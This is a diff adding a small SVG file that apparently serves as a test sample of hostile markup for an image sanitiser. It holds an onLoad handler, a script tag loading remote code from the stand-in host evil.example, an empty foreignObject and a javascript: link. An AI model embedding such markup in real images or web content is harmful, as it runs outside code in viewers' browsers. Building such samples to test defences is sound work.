@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onLoad="go()">
+  <rect width="10" height="10"/>
+  <script src="https://evil.example/x.js"/>
+  <foreignObject/>
+  <a href="javascript:void(0)"><path d="M0 0h1v1z"/></a>
+</svg>
